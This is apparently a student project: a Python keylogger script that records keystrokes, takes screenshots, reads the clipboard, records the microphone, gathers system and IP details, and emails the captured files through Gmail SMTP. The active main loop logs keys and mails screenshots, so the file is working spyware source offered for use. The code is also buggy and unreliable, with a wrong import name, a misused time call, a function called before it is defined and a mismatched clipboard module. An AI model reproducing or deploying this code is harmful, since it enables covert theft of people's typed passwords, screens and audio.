#Imports and Libraries
import pywin32
from time import time
import pynput
import scipy
import cryptography
import requests
import sounddevice
import PIL

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

from pynput.keyboard import Key, Listener

import socket
import platform

import win32clipboard as clipboard

from scipy.io.wavfile import write
import sounddevice as sd

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

from cryptography.fernet import Fernet

import getpass
from requests import get

# Files
keys_information = "key_log.txt"
system_information = "system_info.txt"
file_path = "//home//venessa//Documents//Prasunet//Keylogger"
extend = "//"
email_address = "your_email@gmail.com"
password = "your_password"
toaddr = "your_email2@gmail.com"
clipboard_information = "clipboard.txt"
microphone_time = 10
audio_info = "audio.wav"
screenshot_info = "screenshot.png"
time_iteration = 15
no_of_iterations_end = 3

#Send email
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log_File"
    body = "Body_of_mail"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())
    encoders.encode_base64(p)

    p.add_header('Content_Dispostion', "attachment; filename= %s" %filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)
    s.quit()

#Enable next line for email functionality
#send_email(keys_information, file_path + extend + keys_information, toaddr)

#System Information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        ipaddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processsor: " + (platform.processor()) + "\n")
        f.write("System:" + platform.system() + " " + platform.version() + '\n')
        f.write("Machine:" + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + ipaddr + '\n')

#Enable next line for system information
#computer_information()

#Recording Microphone
def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_info, fs, myrecording)

#Enable next line for microphone recording
#microphone()

#Screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_info)

#Enable next line for screenshot
#screenshot()

#Timer
no_of_iterations = 0
current_time = time.time()
stopping_time = current_time + time_iteration
while no_of_iterations < no_of_iterations_end:
    #Keylogger
    count = 0
    keys = []

    def on_press(key):
        global keys, count, current_time

        print(key)
        keys.append(key)
        count += 1
        current_time = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend+ keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if current_time > stopping_time:
            return False
        
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if current_time > stopping_time:
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")
        screenshot()
        send_email(screenshot_info, file_path + extend + screenshot_info, toaddr)
        clipboard()
        no_of_iterations += 1
        current_time = time.time()
        stopping_time = time.time() + time_iteration

    #Clipboard
    def clipboard():
        with open(file_path + extend + clipboard_information, "a") as f:
            try:
                win32clipboard.OpenClipboard()
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()

                f.write("Clipboard Data: \n" + pasted_data)
            except:
                f.write("Clipboard could not be copied")